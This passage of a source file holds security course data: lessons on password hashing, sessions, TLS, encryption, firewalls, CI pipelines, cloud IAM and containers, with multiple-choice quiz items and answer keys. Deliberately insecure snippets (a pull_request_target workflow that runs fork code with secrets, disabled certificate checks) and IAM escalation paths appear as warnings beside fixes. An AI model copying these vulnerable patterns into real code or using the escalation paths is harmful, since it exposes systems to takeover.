    chapter(
      'Identity and Cryptography',
      'Storing passwords so a breach is survivable, keeping sessions honest, and using encryption for the jobs it is actually good at.',
      [
        lesson('Password Storage and Authentication Done Right', 14, `
Password handling is where a single wrong function call turns a database leak into a mass account takeover. The rules are short, and the wrong answers are all things that look reasonable.

### Encoding, encryption, hashing — three different tools

| | Reversible? | Needs a key? | Use it for |
|---|---|---|---|
| **Encoding** (Base64, URL) | Yes, by anyone | No | Transport formatting. **Never** security. |
| **Encryption** (AES) | Yes, with the key | Yes | Data you must read back: API tokens, ID numbers |
| **Hashing** (Argon2, SHA-256) | No | No | Data you only ever need to *compare*: passwords |

Passwords belong in row three. You never need to read a password back — you only need to answer "does this input match?". Anything reversible is a liability, because a key that exists can be stolen.

### Use a slow, memory-hard hash

\`\`\`js
import argon2 from 'argon2';

// OWASP baseline parameters: ~19 MiB memory, 2 iterations, 1 lane.
const OPTS = { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 };

export const hashPassword = (plain) => argon2.hash(plain, OPTS);           // salt is automatic

export async function verifyPassword(hash, plain) {
  if (!(await argon2.verify(hash, plain))) return { ok: false };
  // Silently upgrade old hashes when you raise the parameters.
  return { ok: true, rehash: argon2.needsRehash(hash, OPTS) };
}
\`\`\`

**Slowness is the feature.** A modern GPU tests billions of SHA-256 guesses per second; Argon2id's memory cost is what makes that hardware advantage collapse. Argon2id is the current first choice, bcrypt (cost 10–12) and scrypt are acceptable, and MD5, SHA-1 and plain SHA-256 are wrong for passwords no matter how many times you apply them.

One bcrypt trap worth knowing: most implementations **silently truncate at 72 bytes**, so a passphrase longer than that has its tail ignored. Argon2 has no such limit.

### Salt and pepper

A **salt** is a unique random value per password, stored alongside the hash. It ensures two users with the same password get different hashes, which defeats precomputed rainbow tables and stops an attacker cracking one hash and getting a thousand accounts. Argon2 and bcrypt generate and embed the salt for you — if you find yourself writing salt-handling code, you are using the wrong library.

A **pepper** is a single secret value, mixed in but stored **outside** the database (an HSM, KMS, or environment variable on a different host). Its whole value is that a stolen database dump alone is uncrackable. It is only worth adding if the pepper genuinely lives somewhere the database backup does not.

### Do not answer questions the attacker asked implicitly

\`\`\`js
// Vulnerable to timing-based user enumeration: unknown users return in 2 ms,
// real ones in 250 ms because argon2 ran. The clock answers what the message hid.
const user = await User.findOne({ email });
if (!user) return res.status(401).json({ message: 'Invalid email or password' });

// Correct: burn the same work either way.
const user = await User.findOne({ email });
const hash = user?.passwordHash ?? DUMMY_HASH;   // a real argon2 hash of a random string
const ok = await argon2.verify(hash, password);
if (!user || !ok) return res.status(401).json({ message: 'Invalid email or password' });
\`\`\`

The same discipline applies to signup ("if that address is new, we have sent a link") and password reset (always the same confirmation, whether or not the account exists).

### Password reset is an authentication path

It is a second front door, and it is routinely built with less care than the first. The rules:

- The token is **cryptographically random**, at least 32 bytes from \`crypto.randomBytes\`, never a UUIDv4-as-secret or anything derived from the user id or timestamp.
- Store only a **hash** of the token. A leaked database must not yield working reset links.
- **Single use** and **short lived** — 15 to 60 minutes, invalidated on use and on password change.
- Changing the password **invalidates every existing session**, which is the entire point when recovering from a compromise.
- Never email the new password, and never log the token.
        `),
        lesson('Sessions, Tokens, and Multi-Factor Authentication', 13, `
Authentication happens once; **the session is what an attacker actually steals**. How you carry identity across requests decides how quickly you can take it away again.

### Server sessions versus JWTs

| | Server session (cookie holds an id) | JWT (cookie or header holds claims) |
|---|---|---|
| State | In your store | In the token |
| Revocation | Instant — delete the row | Hard — valid until it expires |
| Scaling | Needs a shared store | Stateless |
| Size | Tiny id | Grows with claims |
| Best for | Normal web apps | Short-lived service-to-service calls |

Teams pick JWTs for scale and then discover the cost the first time they need to ban a user, and the honest default for a typical web application is a server-side session. If you do use JWTs, keep the access token short (5–15 minutes) and pair it with a refresh token you can revoke.

### Cookie flags are the actual security control

\`\`\`js
res.cookie('sid', sessionId, {
  httpOnly: true,        // JavaScript cannot read it, so XSS cannot exfiltrate it
  secure: true,          // HTTPS only, never sent over plain HTTP
  sameSite: 'lax',       // not attached to cross-site POSTs -> kills most CSRF
  path: '/',
  maxAge: 1000 * 60 * 60 * 8,
});
\`\`\`

Use the **\`__Host-\`** name prefix (\`__Host-sid\`) when you can: browsers refuse to accept such a cookie unless it is Secure, path \`/\`, and has no \`Domain\` attribute, which blocks a compromised subdomain from setting a session cookie for the parent.

### Regenerate the session id at login

\`\`\`js
// Session fixation: the attacker plants a known id, then the victim logs in on it.
req.session.regenerate((err) => {          // new id issued at the privilege change
  if (err) return next(err);
  req.session.userId = user.id;
  req.session.save(next);
});
\`\`\`

Any change in privilege level — login, MFA completion, role elevation — should mint a new identifier. Omitting this is a subtle bug that never shows up in testing because nothing looks broken.

### JWT pitfalls, if you go that way

- **Never trust the token's own \`alg\` header.** Pin the algorithm at verification: \`jwt.verify(token, key, { algorithms: ['RS256'] })\`. Accepting \`alg: none\` or letting an attacker downgrade RS256 to HS256 with the public key as the HMAC secret are both classic forgeries.
- **Verify \`iss\` and \`aud\`**, or a token from a different service will be accepted by yours.
- **Do not put secrets in the payload.** It is signed, not encrypted — anyone can Base64-decode it.
- **Prefer a cookie over \`localStorage\`.** \`localStorage\` is readable by any script on the page, so one XSS becomes a stolen token; \`HttpOnly\` cookies are not.

Refresh tokens should **rotate**: each use issues a new one and invalidates the old. If an old token is presented again, that is a strong signal of theft — revoke the whole family and force re-authentication.

### The MFA ladder

| Factor | Stops stuffing | Stops phishing | Notes |
|---|---|---|---|
| SMS code | Yes | No | SIM swap and interception risk; better than nothing |
| TOTP app | Yes | No | Code can be relayed to the real site in real time |
| Push approval | Yes | Partly | Vulnerable to MFA fatigue spam; add number matching |
| **WebAuthn / passkey** | Yes | **Yes** | Origin-bound; nothing useful to phish |

Every rung stops credential stuffing, because a leaked password is no longer enough. Only the last row — WebAuthn / passkeys — stops phishing. Prioritise passkeys for administrators, and secure the **recovery** flow to the same standard — an account with a passkey and an SMS-based "lost my key" path is protected at the strength of the SMS.
        `),
        lesson('Encryption in Transit and at Rest', 15, `
Cryptography is easy to invoke and easy to invoke wrongly. What matters is knowing which property each tool provides and never asking one to do another's job.

### Symmetric, asymmetric, and why real systems use both

| | Symmetric (AES) | Asymmetric (RSA, ECDSA, X25519) |
|---|---|---|
| Keys | One shared secret | Public + private pair |
| Speed | Very fast, bulk data | Slow, small payloads |
| Problem it has | Distributing the key safely | Performance |
| Used for | Encrypting the actual data | Key agreement, signatures, certificates |

TLS uses both, which is exactly the reason it works: asymmetric cryptography solves the key distribution problem for a few hundred bytes, then hands off to symmetric cryptography for the megabytes.

### What a TLS handshake does

1. Client offers protocol versions and cipher suites.
2. Server returns its **certificate** — its public key, bound to its hostname, signed by a Certificate Authority the client already trusts.
3. Client validates the chain, the expiry, and that the hostname matches. **This step is what stops a machine-in-the-middle**, and it is the step people disable.
4. Both sides run a key exchange (ECDHE) to derive a fresh symmetric session key. Forward secrecy means recording today's traffic is useless even if the server key leaks next year.
5. Everything after this is AES-GCM under that ephemeral key.

TLS gives you confidentiality, integrity, and server authenticity **on the wire**. It gives you nothing against a compromised server, a malicious insider, XSS, or a database dump. "We use HTTPS" is not an answer to "how is that data protected?".

\`\`\`js
// The most dangerous three words in an incident report: "it worked in staging".
const agent = new https.Agent({ rejectUnauthorized: false });  // NEVER in any deployed code
\`\`\`

Disabling certificate validation to silence a staging error removes the only thing making the channel authentic — the tunnel is still encrypted, just possibly to the attacker. Fix the certificate instead, and add \`Strict-Transport-Security: max-age=63072000; includeSubDomains\` so browsers refuse to downgrade in the first place.

### Encryption at rest, with the nonce rule that bites

\`\`\`js
import { randomBytes, createCipheriv, createDecipheriv } from 'node:crypto';

export function encrypt(plaintext, key) {          // key: 32 random bytes from a KMS
  const iv = randomBytes(12);                      // UNIQUE per message, every time
  const c = createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([c.update(plaintext, 'utf8'), c.final()]);
  return { iv, ct, tag: c.getAuthTag() };          // tag proves it was not modified
}

export function decrypt({ iv, ct, tag }, key) {
  const d = createDecipheriv('aes-256-gcm', key, iv);
  d.setAuthTag(tag);                               // throws if the ciphertext was tampered with
  return Buffer.concat([d.update(ct), d.final()]).toString('utf8');
}
\`\`\`

Two non-negotiables. **Use an authenticated mode** (GCM or ChaCha20-Poly1305), because plain AES-CBC hides data without detecting modification. And **never reuse an IV with the same key** in GCM — a repeated nonce leaks the keystream and can expose the authentication key. Generating the IV randomly per message, as above, is what keeps that safe.

Then there is key management, which is the actually hard part. Use **envelope encryption**: a cloud KMS holds the key-encryption key, your app receives a per-record data key, and only the wrapped key is stored. Rotation becomes possible, and the plaintext key never sits in your repository or your environment file.

Full-disk encryption protects against a stolen server or laptop. It does **not** protect a running application from a SQL injection — the filesystem happily decrypts for the process doing the reading. Field-level encryption is what limits the blast radius of an application-layer breach.

### Choosing the right primitive

| Need | Use |
|---|---|
| Verify a password | Argon2id / bcrypt |
| Read the value back later | AES-256-GCM with a KMS-managed key |
| Detect tampering by someone with a shared secret | HMAC-SHA256 |
| Prove origin to people without your secret | Ed25519 / RSA signature |
| Fingerprint a file | SHA-256 |
| Compare two secrets in code | \`crypto.timingSafeEqual\` |

That last row matters more than it looks: \`===\` on strings short-circuits at the first differing byte, so an attacker can recover a token one character at a time by measuring response times.
        `),
      ],
      [
        q('Why is Argon2id preferred over SHA-256 for storing passwords?', [
          'It is deliberately slow and memory-hard, so GPU cracking of a stolen database is impractical',
          'It produces a longer digest',
          'It can be reversed with the server key',
          'It does not require a salt',
        ], 0, 'Password hashes should be expensive to compute; general-purpose fast hashes let attackers test billions of candidates per second.'),
        q('Your login returns the same message for unknown users and wrong passwords, but unknown users respond in 3 ms and valid ones in 240 ms. What is the problem?', [
          'The database needs an index on email',
          'The response should be 404 for unknown users',
          'Timing still reveals which accounts exist, so verify against a dummy hash',
          'Nothing — the messages are identical',
        ], 2, 'Enumeration leaks through any observable difference, so both paths must perform the same expensive work.'),
        q('A JWT is accepted with alg set to none. What is the correct fix?', [
          'Rotate the signing secret',
          'Pin the accepted algorithms explicitly at verification time',
          'Shorten the token expiry',
          'Move the token from localStorage to a cookie',
        ], 1, 'Never let the token declare how it should be verified; the server must specify the algorithm list it will accept.'),
        q('Which claim about TLS is accurate?', [
          'It encrypts the database at rest as well',
          'It removes the need to validate input from clients',
          'It prevents XSS by encrypting scripts',
          'It protects data on the wire but does nothing about a compromised server or a stolen database dump',
        ], 3, 'TLS secures the channel only; confidentiality at the endpoints requires separate controls.'),
      ]
    ),
    chapter(
      'Networks, Operations, and Response',
      'Shrinking what is reachable, building security into the development process, and knowing exactly what to do in the first hour of an incident.',
      [
        lesson('Network Fundamentals: Ports, Firewalls, and VPNs', 13, `
Your **attack surface** is the set of things an attacker can reach. Most small-team breaches begin with something reachable that nobody intended to expose, so the highest-value hour you will spend is the one auditing what is listening.

### Ports are doors, services are what is behind them

| Port | Service | Exposure guidance |
|---|---|---|
| 22 | SSH | Keys only, no passwords; restrict source addresses |
| 80 / 443 | HTTP / HTTPS | Public; redirect 80 to 443 |
| 3306 / 5432 | MySQL / PostgreSQL | **Never** public |
| 6379 | Redis | Never public; default build has no auth |
| 27017 | MongoDB | Never public |
| 3389 | RDP | Never public — a top ransomware entry point |
| 9200 | Elasticsearch | Never public |

Audit your own host first — this is your machine, so run it freely:

\`\`\`bash
ss -tulpn                       # every listening socket, with the owning process
sudo lsof -i -P -n | grep LISTEN
\`\`\`

The line to hunt for is a database bound to \`0.0.0.0\` rather than \`127.0.0.1\`. Internet-wide scanners find an exposed database within minutes of it appearing, and a large share of "we were hacked" stories are exactly this plus a default password.

### Firewalls: default deny, then allow

A firewall is an ordered rule list ending in an implicit reject. Get the default right and the rest is bookkeeping.

\`\`\`bash
sudo ufw default deny incoming        # nothing gets in unless listed below
sudo ufw default allow outgoing
sudo ufw allow from 203.0.113.0/24 to any port 22 proto tcp   # SSH from the office only
sudo ufw allow 443/tcp                                        # the app, for everyone
sudo ufw enable
\`\`\`

A **stateful** firewall tracks connections, so replies to traffic you initiated are allowed automatically and you only ever write inbound rules. Cloud security groups follow the same model; the equivalent mistake there is \`0.0.0.0/0\` on a management port, added "temporarily" during setup.

Restrict **egress** too, at least for servers. Most malware needs to call home, and a database server that can only reach your app tier and your package mirror is a poor launch pad.

### Segmentation

Put the load balancer in a public subnet and everything else in a private one with no inbound internet route. Reach it through a bastion host or an identity-aware proxy. A flat network is why one compromised laptop turns into a company-wide ransomware event: the intruder gets one machine, then finds every other machine is one hop away.

### VPNs: what they do and do not do

A VPN creates an encrypted tunnel to a network you trust, which genuinely solves two problems: **reaching internal services** that are not publicly exposed, and protecting traffic on a network you do not control.

What it does **not** do, despite the marketing:

- It does not make you anonymous. It moves the observation point from your ISP to the VPN provider.
- It does not protect against malware, phishing, or a vulnerable application.
- It does not add much to already-encrypted traffic. With HTTPS almost everywhere, the "coffee shop wifi" pitch is far weaker than it was in 2012.
- It **expands** trust: a compromised laptop on the VPN is now a compromised device inside your network.

That last point is why zero-trust access is displacing corporate VPNs. Instead of "on the network means trusted", each request is authenticated and authorised on its own — device posture, user identity, and the specific service being reached — so one compromised endpoint gets one application rather than an entire subnet.

### The five-minute exposure audit

Run this on your own infrastructure quarterly: list every public IP and DNS name you own, check which ports respond, confirm each one is deliberate, verify TLS certificates are valid and not expiring, and delete anything nobody can name an owner for. Forgotten staging environments with production data are the most common finding, and by a wide margin.
        `),
        lesson('Secure Development and Dependency Hygiene', 14, `
Security bugs are cheapest at design time and most expensive after disclosure. The point of a secure development process is to move discovery earlier, with automation doing the boring parts so humans review the parts that need judgement.

### Where each control belongs

| Stage | Control | Catches |
|---|---|---|
| Design | Threat model (Chapter 1) | Missing authorisation, bad trust boundaries |
| Code | Secure defaults, validation library | Injection, XSS, mass assignment |
| Commit | Secret scanning pre-commit hook | Keys about to enter git history |
| CI | SAST, dependency audit, lockfile check | Known-vulnerable packages, risky patterns |
| Pre-release | DAST, manual review of auth paths | Access control, business logic |
| Runtime | Logging, alerting, patch cadence | Everything you missed |

No single row is sufficient, and the cheapest rows are at the top.

### Secrets: assume git is forever

\`\`\`bash
git rm --cached .env && echo '.env' >> .gitignore   # step one, not the whole job
\`\`\`

Deleting a committed secret in a later commit does **not** remove it. It lives in the history, in every clone, in every fork, and in GitHub's event feed, which bots scrape continuously — leaked cloud keys are typically abused within minutes. **Committing a secret means rotating it.** Rewriting history is optional cleanup; rotation is the actual fix.

Prevent it structurally: run \`gitleaks\` or \`trufflehog\` as a pre-commit hook and in CI, commit a \`.env.example\` with names and dummy values, and in CI prefer short-lived OIDC credentials over long-lived stored secrets.

### Dependencies are code you did not review

\`\`\`bash
npm ci                      # install exactly the lockfile; never npm install in CI
npm audit --omit=dev        # what is actually shipped
npm audit signatures        # verify registry provenance
\`\`\`

Practices that pay for themselves:

- **Commit the lockfile** and install with \`npm ci\`. Without it, "it worked yesterday" is a supply-chain event waiting to happen.
- **Read the package name carefully.** Typosquats (\`crossenv\` for \`cross-env\`) rely on a single glance.
- **Prefer fewer, larger, maintained dependencies.** A leftpad-sized package still runs install scripts with your privileges.
- **Consider \`--ignore-scripts\`** for CI installs; postinstall hooks are a favourite malware vector.
- **Triage, do not panic.** A prototype-pollution advisory in a dev-only build tool is not the same risk as an RCE in your HTTP parser. Ask whether the vulnerable path is reachable in your usage.

The common mistake is treating \`npm audit fix --force\` as a security process. It happily installs major-version breaking changes to clear a warning that may not even apply to you, and the resulting churn trains the team to ignore the tool.

### Secure defaults beat vigilance

Make the safe path the easy path, once, at the framework level:

\`\`\`js
app.use(helmet());                                   // security headers, CSP, no sniffing
app.use(express.json({ limit: '100kb' }));           // bound the body size
app.use(rateLimit({ windowMs: 60_000, max: 60 }));   // blunt the automated stuff
app.disable('x-powered-by');                         // stop announcing the stack
app.use(validate(schema));                           // reject unknown fields by default
\`\`\`

### A review checklist that finds real bugs

1. Does every new endpoint have both authentication **and** an object-level authorisation check?
2. Is all input validated server-side, with unknown fields stripped?
3. Are queries parameterised, including in raw escape hatches?
4. Is any user-controlled data rendered as HTML?
5. Does the server fetch any URL a user supplied?
6. Are new secrets read from the environment or a secret manager?
7. Do error responses avoid stack traces, and do logs avoid credentials?

Seven questions, five minutes per pull request, and they cover the majority of what actually gets exploited.
        `),
        lesson('Logging, Incident Response, and Everyday Hygiene', 15, `
You cannot respond to what you cannot see, and you cannot investigate with logs you did not keep. Detection and response are what turn a breach into an incident instead of a headline.

### Log the five facts, structured

\`\`\`js
log.info({
  event: 'auth.login.failed',      // stable machine-readable name
  actor: user?.id ?? null,         // who
  ip: req.ip,                      // where from
  userAgent: req.get('user-agent'),
  reason: 'bad_password',          // outcome
  requestId: req.id,               // ties every line of one request together
}, 'login failed');
\`\`\`

**Who, what, when, where, outcome** — plus a request id so you can reconstruct a session. Structured JSON is not a style preference; it is what makes "show me every failed login for this account across three services" a query rather than an afternoon of grep.

Log every authentication attempt, authorisation failure, privilege change, password or MFA change, admin action, and data export.

### Never log these

Passwords, tokens, session ids, API keys, full card numbers, and raw personal data. Logs are widely readable, shipped to third parties, and retained for years — a password in a log file is a password in a breach. Configure redaction centrally so nobody has to remember:

\`\`\`js
const log = pino({ redact: ['req.headers.authorization', 'req.headers.cookie', '*.password'] });
\`\`\`

Ship logs **off the machine** as they are written. An attacker's first housekeeping task is clearing local logs, and a remote append-only copy is what preserves the story. Keep 90 days hot for investigation and a year in cheap storage; intrusions are frequently discovered months later.

### Three alerts worth having on day one

1. **Successful login from a new country immediately after one elsewhere** — impossible travel, a strong session-theft signal.
2. **A sudden spike in 403s or 401s from one account or IP** — enumeration or access-control probing in progress.
3. **Any new admin grant, or a change to MFA settings** — the step attackers take right before the damage.

Route them to a channel a human reads. An alert nobody sees is worse than no alert, because it creates a false sense of coverage.

### The first hour

Follow the four NIST phases: **prepare**, **detect and analyse**, **contain, eradicate and recover**, **learn**. Written down before you need it:

1. **Assign roles.** One incident lead who decides, one scribe who timestamps everything, one comms owner. Without a lead, five people investigate the same log.
2. **Contain, do not destroy.** Isolate the host from the network — but **do not power it off**, because memory holds keys, processes and the attacker's tooling. Snapshot the disk and capture memory first.
3. **Preserve evidence.** Copy logs before rotation eats them. Note times in UTC.
4. **Cut the access path.** Revoke sessions and tokens, rotate the credentials involved, disable the compromised account.
5. **Scope it honestly.** What did that identity have access to? Assume everything it could reach is suspect until proven otherwise.
6. **Escalate on the clock.** Many jurisdictions require notification within 72 hours of becoming aware. Legal and comms belong in the room early, not after.

Afterwards, run a **blameless post-mortem**. Ask "what made this possible and what made it hard to detect", not "who clicked". Every finding becomes a dated, owned action item, or the same incident recurs.

### The hygiene baseline for a person or a five-person team

| Do this | Because |
|---|---|
| Password manager, unique password everywhere | Kills credential stuffing at the source |
| Passkeys or TOTP on email, banking, cloud, code hosting | Email is the master key to every reset flow |
| Automatic OS and browser updates | Most exploited flaws had a patch available |
| Full-disk encryption on every laptop and phone | A lost device stops being a breach |
| Separate admin account from the daily one | Blocks most malware persistence |
| Backups on the 3-2-1-1-0 rule, restore tested | The answer to ransomware |
| Review OAuth app grants twice a year | Old integrations retain broad access silently |
| A written offboarding checklist | Ex-staff access is a top small-business finding |

None of it is advanced. All of it is what actually shows up in incident reports.
        `),
      ],
      [
        q('ss -tulpn shows PostgreSQL listening on 0.0.0.0:5432 on a cloud VM. What is the priority fix?', [
          'Enable TLS on the database connection',
          'Rename the default postgres user',
          'Bind it to 127.0.0.1 or a private interface and deny 5432 at the firewall',
          'Increase the password length',
        ], 2, 'A publicly reachable database is found by internet-wide scanners within minutes; removing the exposure matters more than hardening it in place.'),
        q('Which statement about a corporate VPN is correct?', [
          'It removes the need for MFA on internal apps',
          'It protects the endpoint from malware',
          'It makes browsing anonymous',
          'It extends your trusted network to the connecting device, so a compromised laptop becomes an internal threat',
        ], 3, 'A VPN grants network reach; it authenticates the tunnel, not the health of the machine at the end of it.'),
        q('An AWS key was committed and removed in the next commit. What must happen?', [
          'Rotate the key, because it remains in git history, clones, and forks',
          'Nothing — the later commit removed it',
          'Force-push the branch and consider it resolved',
          'Add the file to .gitignore',
        ], 0, 'History is distributed and scraped by bots, so exposure is permanent and only rotation actually invalidates the secret.'),
        q('A server is confirmed compromised. Which first action best preserves the investigation?', [
          'Power it off immediately to stop the attacker',
          'Isolate it from the network but leave it running, then capture memory and a disk snapshot',
          'Reinstall the operating system straight away',
          'Delete the malicious files you can find',
        ], 1, 'Shutting down destroys volatile evidence such as keys and running processes, while isolation stops the attacker without losing it.'),
      ]
    ),
    chapter(
      'Cloud, Containers, and the Supply Chain',
      'Where the perimeter went: the permissions, images and build pipelines that decide how far one stolen credential actually travels.',
      [
        lesson('Cloud IAM and the Blast Radius of One Key', 14, `
Chapter 5 shrank what an attacker can reach over the network. In a cloud account that perimeter barely exists — every service is an HTTPS endpoint on the public internet, and what stops a request is a **policy decision**, not a firewall rule. Identity is the perimeter, and an IAM policy is the only thing standing between one leaked credential and the account.

### Read every policy as four questions

**Who** (the principal), **which actions**, **which resources**, **under what conditions**. A statement that cannot answer the last two is not a policy, it is a wish:

\`\`\`json
{ "Effect": "Allow", "Action": "s3:*", "Resource": "*" }
\`\`\`

That grants read, write, delete and bucket-policy rewrite on every bucket in the account. It gets written because a deploy failed at six on a Friday and the wildcard made it pass, and nobody comes back to narrow it. Write the narrow version first instead:

\`\`\`json
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::uploads-prod/tenants/*",
  "Condition": { "Bool": { "aws:SecureTransport": "true" } }
}
\`\`\`

Now recall the SSRF lesson in Chapter 3. An attacker who reaches \`169.254.169.254\` from your web server does not get "some AWS access" — they get **exactly this role**. With the wildcard, that one bug is total account compromise; with the scoped statement it is read and write on one prefix of one bucket. The vulnerability is identical. The policy decided the outcome.

### Stop issuing long-lived keys

A static access key has no expiry, ends up in \`.env\` files and CI settings, and works from anywhere on earth. Replace it wherever you can:

| Workload | Use instead |
|---|---|
| Code on an instance, container or function | An attached **role** — credentials fetched and rotated automatically |
| CI pipelines | **OIDC federation** to a role (next lesson) |
| A human at a terminal | SSO with a session that expires the same day |
| A third party acting on your behalf | \`sts:AssumeRole\` with an **ExternalId** |

That last row is the **confused deputy** problem: the vendor's role trusts their account, so without an ExternalId another of their customers can name your role ARN and borrow your permissions through the vendor.

### The permissions that are secretly "admin"

Least privilege fails when a narrow-looking grant is a path to a wide one. Treat these as administrator-equivalent whatever resource they name:

- \`iam:PassRole\` combined with any compute-create action — launch something that assumes a bigger role.
- \`iam:CreatePolicyVersion\` or \`iam:AttachUserPolicy\` — the principal edits its own permissions.
- \`lambda:UpdateFunctionCode\` on a function whose role you want.
- \`ssm:SendCommand\` — remote code execution on every managed instance.

### Guardrails and detection

Individual policies drift, so put a ceiling above them. Service control policies and permission boundaries express rules no policy underneath may exceed: no root usage, no region outside eu-west-1, no disabling CloudTrail. They deny; they never grant.

Then measure, because every major provider records when each permission was last used:

\`\`\`bash
aws iam generate-service-last-accessed-details --arn arn:aws:iam::111122223333:role/web
aws accessanalyzer list-findings --analyzer-arn "$ANALYZER"   # resources shared externally
\`\`\`

A role holding \`s3:*\` that has only ever called \`GetObject\` in ninety days tells you exactly what to cut, with evidence instead of argument.

### The mistake

Reviewing the policy you are writing and ignoring the ones already attached. Permissions accumulate: the role scoped correctly in March collected three more statements by August, each the fastest fix at the time. Audit **effective** permissions quarterly, and delete unused roles, keys and users outright — an unused credential is pure liability, because nobody will notice it being used either.
        `),
        lesson('Container Images You Can Actually Trust', 14, `
A container image is a stack of tarballs and a JSON manifest. Nothing in it is private, nothing in it is verified, and by default the process inside runs as **root**. Every hardening step below removes one of those defaults.

### A Dockerfile that is boring in the right ways

\`\`\`dockerfile
# Pin by digest: tags move, digests do not.
FROM node:22-alpine@sha256:4b2b... AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci --ignore-scripts          # lockfile only, no postinstall hooks (Chapter 5)
COPY . .
RUN npm run build

FROM node:22-alpine@sha256:4b2b...   # multi-stage: build tools never ship
WORKDIR /app
ENV NODE_ENV=production
COPY --from=build --chown=node:node /app/dist ./dist
COPY --from=build --chown=node:node /app/node_modules ./node_modules
USER node                            # drop root before the process ever starts
EXPOSE 3000
CMD ["node", "dist/server.js"]
\`\`\`

The multi-stage split is not only about size. Compilers, package managers and git history inside a running production image are tools you have handed to whoever gets code execution.

### Layers remember everything

This is the classic container bug:

\`\`\`dockerfile
COPY .env /app/.env
RUN npm run migrate && rm /app/.env   # the secret is STILL in the earlier layer
\`\`\`

Deleting a file in a later layer only marks it removed in the union filesystem. Anyone holding the image can run \`docker history --no-trunc\` or unpack the layer and read it, and the same applies to an \`ARG\` value baked into an \`ENV\`. Secrets must arrive at **runtime** from the orchestrator or a secret manager, or through a build-secret mount that never becomes a layer. Keep them out of the build context to begin with:

\`\`\`text
# .dockerignore
.git
.env*
node_modules
**/*.pem
\`\`\`

### Runtime is where the real limits live

\`\`\`yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  allowPrivilegeEscalation: false   # stops setuid binaries regaining root
  readOnlyRootFilesystem: true      # writes go to a mounted volume only
  capabilities:
    drop: ["ALL"]                   # add none back; almost no app needs any
  seccompProfile:
    type: RuntimeDefault
\`\`\`

Two things never to do: \`--privileged\`, which is functionally root on the host, and mounting \`/var/run/docker.sock\` into a container, which lets that container start a new one with the host filesystem attached. Both turn up in CI helper containers constantly.

### Scan, then actually rebuild

\`\`\`bash
trivy image --severity HIGH,CRITICAL --ignore-unfixed myapp:2026.08.1
\`\`\`

\`--ignore-unfixed\` keeps the report to things you can act on today. The follow-through matters more than the scan: you do not patch a running container, you **rebuild the image and redeploy**. Schedule a weekly rebuild from a fresh base even when your own code has not changed, or you ship a six-month-old OpenSSL with a current version number printed on it.

### Know which isolation you are buying

Containers share the host kernel, so a container boundary is a strong operational fence and a **weaker** security boundary than a virtual machine — a kernel vulnerability crosses it. If you run genuinely untrusted code, such as customer-supplied builds or a sandbox for user scripts, reach for a stronger runtime than namespaces alone — a microVM such as Firecracker, or a syscall-intercepting sandbox such as gVisor.

### The mistake

Running as root "because the app cannot write to \`/app/uploads\` otherwise". The fix is a writable volume mounted at that path, not a root process. The moment root is the answer, every dropped capability, read-only filesystem and seccomp profile stops mattering, and one file-write bug becomes host access.
        `),
        lesson('The Build Pipeline Is Production', 14, `
Your CI system can read every repository, holds deployment credentials, and pushes artefacts to production without review. It is the most privileged machine you own, and it runs code submitted by anyone who opens a pull request. Treat it as production, because an attacker already does.

### The single most exploited CI pattern

\`\`\`yaml
# Dangerous: pull_request_target runs with YOUR secrets, and this checks out THEIR code.
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # attacker-controlled
      - run: npm ci && npm test                            # their scripts, your secrets
\`\`\`

Anyone on the internet forks the repository, edits a test file, opens a pull request, and their code executes holding your deployment credentials. Use plain \`pull_request\` for anything that touches fork code — it deliberately runs without secrets and with a read-only token:

\`\`\`yaml
on: pull_request
permissions:
  contents: read        # default-deny the token, then add only what a job needs
jobs:
  test:
    steps:
      - uses: actions/checkout@11bd719...   # pin third-party actions by full commit SHA
      - run: npm ci --ignore-scripts
\`\`\`

Pin by SHA rather than \`@v4\` because **tags are mutable**. Whoever owns that action can repoint the tag at new code tomorrow, and every workflow trusting the tag picks it up silently on the next run.

### Delete the stored cloud keys

A long-lived secret access key in CI settings is reachable by every workflow, every maintainer, and every job that can print an environment variable. Federate instead:

\`\`\`yaml
permissions:
  id-token: write       # mint a short-lived OIDC token for this run
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@e3dd6a4...
    with:
      role-to-assume: arn:aws:iam::111122223333:role/deploy-web
      aws-region: eu-west-1
\`\`\`

The role's trust policy must pin the repository **and** the ref — \`repo:acme/web:ref:refs/heads/main\`, never \`repo:acme/*\`, or a pull request branch in any of your repositories can assume the production deploy role. There is now no key to leak, and the token expires in minutes.

### Dependency confusion

Your app imports an internal package named \`billing-utils\` from a private registry. Someone publishes \`billing-utils\` version \`99.0.0\` to the public npm registry. Default resolution prefers the highest version it can see, so your build fetches the attacker's postinstall script. The defences are structural: use a **scope you own** (\`@acme/billing-utils\`), pin that scope to a single registry in \`.npmrc\`, and never let a public fallback registry answer for internal names.

### Know what you shipped

\`\`\`bash
syft dir:. -o spdx-json > sbom.json               # inventory of the artefact
cosign sign --key cosign.key myapp:2026.08.1
cosign verify --key cosign.pub myapp:2026.08.1    # gate the deploy on this
\`\`\`

An SBOM turns the next \`log4shell\` morning from a week of archaeology into a query. Signing plus verification at deploy time is what stops a tampered artefact reaching production even if the registry itself is compromised.

### Hygiene that costs nothing

- Require review on the default branch and forbid force-push; a repository setting outranks a rule people are supposed to remember.
- Never \`echo\` a secret and avoid \`set -x\` in scripts that touch one — CI logs are widely readable and often retained forever.
- Use separate credentials per environment, so a staging pipeline cannot write to production.
- Rotate anything a build has ever seen when a maintainer leaves.

### The mistake

Hardening the application and leaving the pipeline that deploys it wide open. An attacker needs no production SSH key if they can merge a workflow change — and the audit trail will show the deploy came from CI, exactly as it always does.
        `),
      ],
      [
        q('A web server role holds s3:* on Resource "*" for convenience, and an SSRF bug lets an attacker read the instance metadata endpoint. What does the wildcard change?', [
          'Nothing, because metadata credentials only work from inside the VPC',
          'The attacker gains read-only access to a single bucket',
          'The stolen session inherits every S3 permission the role has, across every bucket in the account',
          'The credentials are rejected because they were not issued to the attacker',
        ], 2, 'Stolen role credentials carry exactly the permissions the policy granted, so scoping the policy is what limits the damage of an identical bug.'),
        q('Why pin a third-party CI action to a full commit SHA rather than a version tag?', [
          'A tag can be moved to point at different code, so it is not an immutable reference',
